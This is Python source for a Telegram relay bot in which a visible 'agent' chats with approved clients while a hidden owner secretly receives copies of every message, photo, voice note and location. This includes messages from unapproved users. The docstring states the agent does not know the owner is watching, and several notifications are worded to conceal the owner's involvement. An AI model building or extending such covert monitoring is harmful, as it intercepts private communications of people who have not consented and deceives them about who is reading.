#!/usr/bin/env python3
"""
Updates Bot — Business relay
  @farangis_f23  : visible agent / gatekeeper (doesn't know owner is watching)
  @vosidjonn     : hidden owner  (sees everything, has final approval)
  everyone else  : clients (must be approved by agent, then by owner)
"""

import base64
import html
import json
import logging
import os
import threading
import urllib.request
import urllib.error
from datetime import datetime, timezone, timedelta
from http.server import HTTPServer, BaseHTTPRequestHandler
from dotenv import load_dotenv
from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    ReplyKeyboardMarkup,
    ReplyKeyboardRemove,
    KeyboardButton,
)
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes,
)

load_dotenv()
logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

TOKEN          = os.getenv("BOT_TOKEN")
OWNER_USERNAME = os.getenv("ADMIN_USERNAME",   "vosidjonn").lstrip("@").lower()
AGENT_USERNAME = os.getenv("ALLOWED_USERNAME", "farangis_f23").lstrip("@").lower()

GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
GITHUB_REPO  = os.getenv("GITHUB_REPO", "vosidjon-sheraliev/updates-bot")
GITHUB_FILE  = "data.json"

DATA_FILE = os.path.join(os.getenv("DATA_DIR", os.path.dirname(os.path.abspath(__file__))), "data.json")

state = {
    "owner_id":     None,
    "agent_id":     None,
    "clients":      {},   # {str(uid): {name, username, agent_approved, owner_approved}}
    "agent_target": None, # uid of the person agent is currently talking to
}

# In-memory only: agent message_id → client user_id  (for reply routing)
# Resets on restart — agent just starts a fresh reply thread
msg_map: dict[int, int] = {}

TASHKENT = timezone(timedelta(hours=5))

QUICK_REPLIES = [
    ("🏠 I'm at home",         "I'm at home!"),
    ("🤫 Can't talk right now", "Can't talk right now"),
    ("☀️ Good morning",         "Good morning!"),
    ("🌙 Good evening",         "Good evening!"),
    ("⏱ Give me a sec",        "Give me a sec!"),
    ("💬 Will reply shortly",   "Will reply shortly"),
    ("📞 Can we talk?",         "Can we talk when you are free?"),
]
QUICK_MAP = {lbl: txt for lbl, txt in QUICK_REPLIES}


# ── Persistence ────────────────────────────────────────────────────────────────

def _github_request(method: str, data: bytes = None):
    """GET or PUT data.json on GitHub."""
    url = f"https://api.github.com/repos/{GITHUB_REPO}/contents/{GITHUB_FILE}"
    req = urllib.request.Request(
        url, data=data, method=method,
        headers={
            "Authorization": f"token {GITHUB_TOKEN}",
            "Accept": "application/vnd.github.v3+json",
            "Content-Type": "application/json",
        },
    )
    with urllib.request.urlopen(req, timeout=10) as resp:
        return json.loads(resp.read())

def _apply_saved(saved: dict):
    state["owner_id"]     = saved.get("owner_id")
    state["agent_id"]     = saved.get("agent_id")
    state["clients"]      = saved.get("clients", {})
    state["agent_target"] = saved.get("agent_target")

def load_state():
    # Try GitHub first (works on any cloud host)
    if GITHUB_TOKEN:
        try:
            data = _github_request("GET")
            content = base64.b64decode(data["content"]).decode()
            _apply_saved(json.loads(content))
            logger.info("State loaded from GitHub.")
            return
        except Exception as ex:
            logger.warning(f"GitHub load failed, falling back to file: {ex}")
    # Fallback: local file
    try:
        with open(DATA_FILE, "r") as f:
            _apply_saved(json.load(f))
    except (FileNotFoundError, json.JSONDecodeError):
        pass

# Cache the GitHub file SHA so we can update (not just create) the file
_github_sha: str | None = None

def save_state():
    global _github_sha
    payload = json.dumps(state, indent=2)
    # Always write local file
    try:
        with open(DATA_FILE, "w") as f:
            f.write(payload)
    except Exception: pass
    # Push to GitHub if token available
    if GITHUB_TOKEN:
        try:
            if not _github_sha:
                try:
                    info = _github_request("GET")
                    _github_sha = info.get("sha")
                except Exception:
                    _github_sha = None
            body: dict = {
                "message": "state update",
                "content": base64.b64encode(payload.encode()).decode(),
            }
            if _github_sha:
                body["sha"] = _github_sha
            result = _github_request("PUT", json.dumps(body).encode())
            _github_sha = result.get("content", {}).get("sha")
        except Exception as ex:
            logger.warning(f"GitHub save failed: {ex}")


# ── Helpers ────────────────────────────────────────────────────────────────────

def e(text: str) -> str:
    return html.escape(str(text))

def fmt_time(dt: datetime) -> str:
    local = dt.astimezone(TASHKENT)
    return f"<i>📅 {local.strftime('%A, %d %b · %H:%M')}</i>"

def fmt_quote(reply_msg) -> str:
    if not reply_msg:
        return ""
    if reply_msg.text:
        preview = reply_msg.text[:60] + ("…" if len(reply_msg.text) > 60 else "")
        return f"┊ <i>{e(preview)}</i>\n\n"
    elif reply_msg.photo:       return "┊ <i>📷 Photo</i>\n\n"
    elif reply_msg.voice:       return "┊ <i>🎤 Voice message</i>\n\n"
    elif reply_msg.video:       return "┊ <i>🎥 Video</i>\n\n"
    elif reply_msg.video_note:  return "┊ <i>🎥 Video note</i>\n\n"
    elif reply_msg.document:    return "┊ <i>📎 File</i>\n\n"
    elif reply_msg.sticker:     return f"┊ <i>{reply_msg.sticker.emoji} Sticker</i>\n\n" if reply_msg.sticker.emoji else "┊ <i>Sticker</i>\n\n"
    elif reply_msg.audio:       return "┊ <i>🎵 Audio</i>\n\n"
    elif reply_msg.location:    return "┊ <i>📍 Location</i>\n\n"
    return ""

def username_of(user) -> str:
    return (user.username or "").lower()

def is_owner(user) -> bool: return username_of(user) == OWNER_USERNAME
def is_agent(user) -> bool: return username_of(user) == AGENT_USERNAME

def client_fully_approved(uid: int) -> bool:
    c = state["clients"].get(str(uid))
    return bool(c and c.get("agent_approved") and c.get("owner_approved"))

def client_label(uid: int) -> str:
    c = state["clients"].get(str(uid), {})
    name  = c.get("name", f"User {uid}")
    uname = f" (@{c['username']})" if c.get("username") else ""
    return f"{name}{uname}"

def agent_kb() -> ReplyKeyboardMarkup:
    rows = [[KeyboardButton("📋 People"), KeyboardButton("❓ Help")]]
    btns = [KeyboardButton(lbl) for lbl, _ in QUICK_REPLIES]
    for i in range(0, len(btns), 2):
        rows.append(btns[i:i+2])
    return ReplyKeyboardMarkup(rows, resize_keyboard=True)

def owner_kb() -> ReplyKeyboardMarkup:
    rows = [[KeyboardButton("👥 Manage"), KeyboardButton("📊 Status")]]
    btns = [KeyboardButton(lbl) for lbl, _ in QUICK_REPLIES]
    for i in range(0, len(btns), 2):
        rows.append(btns[i:i+2])
    return ReplyKeyboardMarkup(rows, resize_keyboard=True)

def agent_decision_kb(uid: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("✅ Approve", callback_data=f"ag_approve_{uid}"),
        InlineKeyboardButton("❌ Deny",    callback_data=f"ag_deny_{uid}"),
    ]])

def owner_decision_kb(uid: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("✅ Approve", callback_data=f"ow_approve_{uid}"),
        InlineKeyboardButton("❌ Deny",    callback_data=f"ow_deny_{uid}"),
    ]])

def owner_override_kb(uid: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("✅ Approve anyway", callback_data=f"ow_approve_{uid}"),
    ]])


# ── /start ─────────────────────────────────────────────────────────────────────

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    # ── Owner ──
    if is_owner(user):
        state["owner_id"] = user.id
        save_state()
        await update.message.reply_text(
            "👑 <b>Owner panel active.</b>\n\n"
            "You approve or deny everyone who wants access.\n"
            "You receive a copy of every message.",
            parse_mode="HTML", reply_markup=owner_kb(),
        )
        return

    # ── Agent — always auto-approved, no permission needed ──
    if is_agent(user):
        state["agent_id"] = user.id
        save_state()
        await update.message.reply_text(
            "👋 <b>Welcome!</b>\n\n"
            "When someone requests access you'll get approve/deny buttons.\n\n"
            "<b>To reply:</b> tap-hold their message → Reply, then type.\n"
            "Or tap 📋 People to choose who to talk to.",
            parse_mode="HTML", reply_markup=agent_kb(),
        )
        return

    # ── Client ──
    uid_str = str(user.id)

    if client_fully_approved(user.id):
        await update.message.reply_text("✅ You're connected! Just send a message.")
        return

    if uid_str in state["clients"]:
        c = state["clients"][uid_str]
        if c.get("agent_approved") and not c.get("owner_approved"):
            await update.message.reply_text("⏳ Your request is being reviewed. Please wait.")
        else:
            await update.message.reply_text("⏳ Your request is pending approval. Please wait.")
        return

    name  = user.first_name or user.username or "Someone"
    uname = f"@{user.username}" if user.username else f"ID:{user.id}"

    state["clients"][uid_str] = {
        "name":           name,
        "username":       user.username or "",
        "agent_approved": False,
        "owner_approved": False,
    }
    save_state()

    agent_id = state["agent_id"]
    if not agent_id:
        await update.message.reply_text("⏳ Not available yet. Try again later.")
        return

    # Notify Farangis — with approve/deny buttons
    try:
        await context.bot.send_message(
            chat_id=agent_id,
            text=(
                f"🔔 <b>New request</b>\n\n"
                f"{e(name)} ({e(uname)}) wants to connect."
            ),
            parse_mode="HTML",
            reply_markup=agent_decision_kb(user.id),
        )
    except Exception as ex:
        logger.error(f"Agent notify failed: {ex}")

    # Notify owner — info only, no buttons
    owner_id = state["owner_id"]
    if owner_id:
        try:
            await context.bot.send_message(
                chat_id=owner_id,
                text=(
                    f"🔔 <b>New request</b>\n\n"
                    f"{e(name)} ({e(uname)}) wants to connect.\n"
                    f"<i>Waiting for Farangis to decide.</i>"
                ),
                parse_mode="HTML",
            )
        except Exception as ex:
            logger.error(f"Owner notify failed: {ex}")

    await update.message.reply_text("⏳ Request sent. You'll be notified once approved.")


# ── Callbacks ──────────────────────────────────────────────────────────────────

async def on_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query     = update.callback_query
    from_user = query.from_user
    data      = query.data   # e.g. "ag_approve_123456"
    await query.answer()

    # ── Set active talk target ──
    if data.startswith("settarget_"):
        if not is_agent(from_user):
            await query.answer("Not authorised.", show_alert=True); return
        uid = int(data.split("_", 1)[1])
        state["agent_target"] = uid
        save_state()
        name = e(client_label(uid))
        await query.edit_message_text(
            f"🟢 <b>{name}</b> is now your active chat.\n\n"
            f"Just type to send — no need to reply to a message.",
            parse_mode="HTML",
        )
        return

    parts  = data.split("_", 2)   # ["ag","approve","123456"]
    who    = parts[0]              # "ag" | "ow"
    action = parts[1]              # "approve" | "deny"
    uid    = int(parts[2])
    uid_str = str(uid)

    if who == "ag" and not is_agent(from_user):
        await query.answer("Not authorised.", show_alert=True); return
    if who == "ow" and not is_owner(from_user):
        await query.answer("Not authorised.", show_alert=True); return

    client = state["clients"].get(uid_str)
    if not client:
        await query.edit_message_text("⚠️ Person not found (may have been removed)."); return

    label = e(client_label(uid))

    # ── Farangis decides ──
    if who == "ag":
        if action == "deny":
            del state["clients"][uid_str]
            save_state()
            await query.edit_message_text(f"❌ You denied <b>{label}</b>.", parse_mode="HTML")
            try:
                await context.bot.send_message(uid, "❌ Your access request was denied.")
            except Exception: pass
            # Inform owner — offer override
            owner_id = state["owner_id"]
            if owner_id:
                try:
                    await context.bot.send_message(
                        owner_id,
                        f"❌ Farangis denied <b>{label}</b>.",
                        parse_mode="HTML",
                        reply_markup=InlineKeyboardMarkup([[
                            InlineKeyboardButton("✅ Approve anyway", callback_data=f"ow_approve_{uid}"),
                        ]]),
                    )
                except Exception: pass
            return

        # Farangis approved — grant access immediately
        client["agent_approved"] = True
        client["owner_approved"] = True
        save_state()
        await query.edit_message_text(f"✅ You approved <b>{label}</b>.", parse_mode="HTML")
        await _grant_access(context, uid)
        # Inform owner — offer revoke
        owner_id = state["owner_id"]
        if owner_id:
            try:
                await context.bot.send_message(
                    owner_id,
                    f"✅ Farangis approved <b>{label}</b> — they now have access.",
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup([[
                        InlineKeyboardButton("🔒 Revoke", callback_data=f"ow_revoke_{uid}"),
                    ]]),
                )
            except Exception: pass
        return

    # ── Owner manages ──
    if who == "ow":
        if action == "revoke":
            if client:
                client["agent_approved"] = False
                client["owner_approved"] = False
                save_state()
            await query.edit_message_text(f"🔒 Revoked access for <b>{label}</b>.", parse_mode="HTML")
            try:
                await context.bot.send_message(uid, "🔒 Your access has been revoked.")
            except Exception: pass
            agent_id = state["agent_id"]
            if agent_id:
                try:
                    await context.bot.send_message(agent_id, f"🔒 <b>{label}</b> has been removed.", parse_mode="HTML")
                except Exception: pass
            return

        if action == "deny":
            state["clients"].pop(uid_str, None)
            save_state()
            await query.edit_message_text(f"❌ Access denied for <b>{label}</b>.", parse_mode="HTML")
            try:
                await context.bot.send_message(uid, "❌ Your access request was denied.")
            except Exception: pass
            # Tell agent (without revealing it was the owner)
            agent_id = state["agent_id"]
            if agent_id:
                try:
                    await context.bot.send_message(agent_id, f"🔒 <b>{label}</b> was removed from the list.", parse_mode="HTML")
                except Exception: pass
            return

        # Owner approved
        if client:
            client["agent_approved"] = True
            client["owner_approved"] = True
        save_state()
        await query.edit_message_text(f"✅ Access granted to <b>{label}</b>.", parse_mode="HTML")
        await _grant_access(context, uid)
        # Notify Farangis — just that someone new is connected, no details about the request
        agent_id = state["agent_id"]
        if agent_id:
            try:
                await context.bot.send_message(
                    agent_id,
                    f"✅ <b>{label}</b> is now connected and can message you.",
                    parse_mode="HTML",
                )
            except Exception: pass


async def _grant_access(context, uid: int):
    try:
        await context.bot.send_message(
            uid,
            "✅ You're connected! Just send a message.",
            reply_markup=ReplyKeyboardRemove(),
        )
    except Exception as ex:
        logger.error(f"Grant notify failed: {ex}")


# ── Message relay ──────────────────────────────────────────────────────────────

async def relay(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg  = update.message
    if not msg: return
    text = msg.text or ""

    # ── Agent sending a message ──
    if is_agent(user):
        if not state["agent_id"]:
            state["agent_id"] = user.id
            save_state()

        if text == "📋 People": await cmd_clients(update, context); return
        if text == "❓ Help":    await help_command(update, context); return

        # Quick reply button — needs a target client via reply
        if text in QUICK_MAP:
            reply = msg.reply_to_message
            client_uid = (msg_map.get(reply.message_id) if reply else None) or state.get("agent_target")
            if not client_uid:
                await msg.reply_text(
                    "⚠️ No active chat. Tap <b>📋 People</b> and choose someone first.",
                    parse_mode="HTML",
                )
                return
            if not client_fully_approved(client_uid):
                await msg.reply_text("⚠️ That person is no longer active.")
                return
            label = e(client_label(client_uid))
            actual_text = QUICK_MAP[text]
            await context.bot.send_message(client_uid, actual_text)
            await msg.reply_text(f"✓ Sent to {label}: <i>{e(actual_text)}</i>", parse_mode="HTML")
            owner_id = state["owner_id"]
            if owner_id:
                ts = fmt_time(msg.date)
                try:
                    await context.bot.send_message(
                        owner_id,
                        f"📤 <b>Agent → {label}</b>\n\n{e(actual_text)}\n\n{ts}",
                        parse_mode="HTML",
                    )
                except Exception: pass
            return

        # Route: reply-to takes priority, then fall back to active target
        reply = msg.reply_to_message
        client_uid = (msg_map.get(reply.message_id) if reply else None) or state.get("agent_target")

        if not client_uid:
            await msg.reply_text(
                "⚠️ No active chat selected.\n\n"
                "Tap <b>📋 People</b> and choose someone to talk to, "
                "or long-press a message → Reply.",
                parse_mode="HTML",
            )
            return

        if not client_fully_approved(client_uid):
            await msg.reply_text("⚠️ That person is no longer active.")
            return

        label = e(client_label(client_uid))
        quote = fmt_quote(msg.reply_to_message)

        try:
            await _send_content(context, msg, client_uid, header=quote or None, ts=None)
        except Exception as ex:
            err = str(ex).lower()
            if "blocked" in err or "forbidden" in err:
                await msg.reply_text("⚠️ Can't send — this person has blocked the bot or hasn't started it yet. Ask them to open the bot and send /start.")
            else:
                await msg.reply_text(f"⚠️ Could not deliver: {ex}")
            return

        await msg.reply_text(f"✓ Delivered to {label}")

        # Silent copy to owner — actual media forwarded
        owner_id = state["owner_id"]
        if owner_id:
            ts = fmt_time(msg.date)
            try:
                await context.bot.send_message(
                    owner_id,
                    f"📤 <b>Agent → {label}</b>\n{ts}",
                    parse_mode="HTML",
                )
                await _send_content(context, msg, owner_id, header=None, ts=None)
            except Exception: pass
        return

    # ── Owner sending a message ──
    if is_owner(user):
        if not state["owner_id"]:
            state["owner_id"] = user.id
            save_state()
        if text == "👥 Manage":  await cmd_clients(update, context); return
        if text == "📊 Status":  await cmd_status(update, context); return

        # Quick reply → send to agent
        agent_id = state["agent_id"]
        if text in QUICK_MAP and agent_id:
            actual_text = QUICK_MAP[text]
            try:
                await context.bot.send_message(agent_id, actual_text)
                await msg.reply_text(f"✓ Sent: <i>{e(actual_text)}</i>", parse_mode="HTML")
            except Exception as ex:
                await msg.reply_text(f"⚠️ Could not send: {ex}")
            return

        # Regular typed message → send to agent
        if agent_id:
            try:
                await _send_content(context, msg, agent_id, header=None, ts=None)
                await msg.reply_text("✓ Sent", parse_mode="HTML")
            except Exception as ex:
                await msg.reply_text(f"⚠️ Could not send: {ex}")
        else:
            await msg.reply_text("⚠️ Agent hasn't started the bot yet.")
        return

    # ── Client sending a message ──

    # Always forward to owner — even if not approved
    _owner_id = state["owner_id"]
    if _owner_id:
        uname   = f"@{user.username}" if user.username else f"ID:{user.id}"
        _name   = e(user.first_name or user.username or "Someone")
        _ts     = fmt_time(msg.date)
        _status = "✅" if client_fully_approved(user.id) else "⏳ not approved"
        try:
            await context.bot.send_message(
                _owner_id,
                f"👁 <b>{_name}</b> ({e(uname)}) {_status}\n{_ts}",
                parse_mode="HTML",
            )
            await _send_content(context, msg, _owner_id, header=None, ts=None)
        except Exception: pass

    if not client_fully_approved(user.id):
        await msg.reply_text("⏳ You don't have access yet. Use /start to request.")
        return

    agent_id = state["agent_id"]
    if not agent_id:
        await msg.reply_text("⚠️ Agent is not available right now. Try later.")
        return

    name  = e(user.first_name or user.username or "Someone")
    quote = fmt_quote(msg.reply_to_message)

    # Forward to agent (no date — clean view)
    try:
        sent = await _send_content(
            context, msg, agent_id,
            header=f"💬 <b>{name}:</b>\n{quote}",
            ts=None,
        )
        if sent:
            msg_map[sent.message_id] = user.id
    except Exception as ex:
        logger.error(f"Relay to agent failed: {ex}")
        await msg.reply_text("⚠️ Could not reach the agent right now."); return

    # Silent copy to owner — actual media forwarded
    owner_id = state["owner_id"]
    if owner_id:
        ts = fmt_time(msg.date)
        try:
            await context.bot.send_message(
                owner_id,
                f"📥 <b>{name} → Agent</b>\n{ts}",
                parse_mode="HTML",
            )
            await _send_content(context, msg, owner_id, header=None, ts=None)
        except Exception: pass


# ── Content sender ──────────────────────────────────────────────────────────────

async def _send_content(context, msg, target_id: int, header: str | None, ts: str):
    """Send msg content to target_id with optional header and timestamp. Returns sent Message."""
    h  = header or ""
    ts_line = f"\n\n{ts}" if ts else ""

    if msg.text:
        return await context.bot.send_message(
            target_id, f"{h}{e(msg.text)}{ts_line}", parse_mode="HTML"
        )
    elif msg.photo:
        cap = h + (e(msg.caption) if msg.caption else "") + ts_line
        return await context.bot.send_photo(target_id, msg.photo[-1].file_id, caption=cap, parse_mode="HTML")
    elif msg.voice:
        return await context.bot.send_voice(target_id, msg.voice.file_id)
    elif msg.video:
        cap = h + (e(msg.caption) if msg.caption else "") + ts_line
        return await context.bot.send_video(target_id, msg.video.file_id, caption=cap, parse_mode="HTML")
    elif msg.video_note:
        return await context.bot.send_video_note(target_id, msg.video_note.file_id)
    elif msg.document:
        cap = h + (e(msg.caption) if msg.caption else "") + ts_line
        return await context.bot.send_document(target_id, msg.document.file_id, caption=cap, parse_mode="HTML")
    elif msg.sticker:
        return await context.bot.send_sticker(target_id, msg.sticker.file_id)
    elif msg.audio:
        cap = h + (e(msg.caption) if msg.caption else "") + ts_line
        return await context.bot.send_audio(target_id, msg.audio.file_id, caption=cap, parse_mode="HTML")
    elif msg.location:
        await context.bot.send_message(target_id, f"{h}📍 Location{ts_line}", parse_mode="HTML")
        return await context.bot.send_location(target_id, msg.location.latitude, msg.location.longitude)
    return None


# ── Commands ───────────────────────────────────────────────────────────────────

async def cmd_clients(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not (is_owner(user) or is_agent(user)): return
    clients = state["clients"]
    if not clients:
        await update.message.reply_text("📋 No one yet."); return

    if is_agent(user):
        # Show each approved person with a "💬 Talk" button to set as active target
        current_target = state.get("agent_target")
        for uid_str, c in clients.items():
            if not (c.get("agent_approved") and c.get("owner_approved")):
                continue
            uid  = int(uid_str)
            name = c.get("name", "?")
            uname = f" @{c['username']}" if c.get("username") else ""
            active_mark = " 🟢" if uid == current_target else ""
            kb = InlineKeyboardMarkup([[
                InlineKeyboardButton(f"💬 Talk to {name}", callback_data=f"settarget_{uid}"),
            ]])
            await update.message.reply_text(
                f"{'🟢' if uid == current_target else '👤'} <b>{e(name)}</b>{e(uname)}{active_mark}",
                parse_mode="HTML", reply_markup=kb,
            )
    else:
        # Owner view — each person with revoke/approve buttons
        for uid_str, c in clients.items():
            uid      = int(uid_str)
            name     = c.get("name", "?")
            uname    = f" @{c['username']}" if c.get("username") else ""
            approved = c.get("agent_approved") and c.get("owner_approved")
            if approved:
                kb   = InlineKeyboardMarkup([[InlineKeyboardButton("🔒 Revoke", callback_data=f"ow_revoke_{uid}")]])
                icon = "✅"
            else:
                kb   = InlineKeyboardMarkup([[
                    InlineKeyboardButton("✅ Approve", callback_data=f"ow_approve_{uid}"),
                    InlineKeyboardButton("❌ Remove",  callback_data=f"ow_deny_{uid}"),
                ]])
                icon = "⏳"
            await update.message.reply_text(
                f"{icon} <b>{e(name)}</b>{e(uname)}",
                parse_mode="HTML", reply_markup=kb,
            )


async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not (is_owner(user) or is_agent(user)): return
    approved = sum(1 for c in state["clients"].values()
                   if c.get("agent_approved") and c.get("owner_approved"))
    pending  = len(state["clients"]) - approved
    await update.message.reply_text(
        f"📊 <b>Status</b>\n\nActive: {approved}\nPending requests: {pending}",
        parse_mode="HTML",
    )


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if is_agent(user):
        await update.message.reply_text(
            "❓ <b>Help</b>\n\n"
            "• New requests will appear with approve/deny buttons.\n"
            "• To reply: <b>long-press their message → Reply</b>.\n"
            "• 📋 People — see everyone connected.",
            parse_mode="HTML",
        )
    elif is_owner(user):
        await update.message.reply_text(
            "❓ <b>Help</b>\n\n"
            "• You receive copies of all messages (📥 incoming, 📤 outgoing).\n"
            "• After agent approves someone, you get the final approve/deny.\n"
            "• If agent denies, you can still override and approve.\n"
            "• 📋 People / 📊 Status for overview.",
            parse_mode="HTML",
        )


# ── Main ───────────────────────────────────────────────────────────────────────

def _start_health_server():
    """Tiny HTTP server so Render keeps the service alive."""
    port = int(os.getenv("PORT", 8000))
    class H(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200); self.end_headers(); self.wfile.write(b"OK")
        def log_message(self, *a): pass
    HTTPServer(("0.0.0.0", port), H).serve_forever()

def main():
    load_state()
    logger.info(
        f"Loaded: owner={state['owner_id']}, "
        f"agent={state['agent_id']}, "
        f"clients={len(state['clients'])}"
    )
    threading.Thread(target=_start_health_server, daemon=True).start()
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start",   start))
    app.add_handler(CommandHandler("status",  cmd_status))
    app.add_handler(CommandHandler("clients", cmd_clients))
    app.add_handler(CommandHandler("help",    help_command))
    app.add_handler(CallbackQueryHandler(on_callback, pattern=r"^(ag|ow)_(approve|deny|revoke)_|^settarget_"))
    app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, relay))
    logger.info("Bot running…")
    app.run_polling(drop_pending_updates=False)

if __name__ == "__main__":
    main()
